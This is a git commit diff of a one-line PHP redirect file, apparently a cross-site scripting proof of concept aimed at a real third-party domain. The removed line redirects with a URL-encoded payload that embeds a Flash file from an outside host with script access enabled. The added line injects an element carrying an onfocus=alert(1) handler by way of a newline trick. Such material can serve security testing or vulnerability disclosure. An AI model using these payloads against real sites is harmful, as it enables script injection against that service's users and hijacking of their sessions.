df52604104d1274eccfdf3061b9a8a43ece6edef
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-08 22:24:50 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3Cembed%2f:script%20allowscriptaccess=always%20src=%2f%2fl0.cm%2fxss.swf%3E') ?> 
+<?php header('location: https://np.lexity.com/f57ea75d/h/1/v/q/k/aaa/u/xxxx/r/fff/vn/1/c/%3Cx~%0Aonfocus=alert(1)%20id=a%20tabindex=0%3E%3C--') ?> 
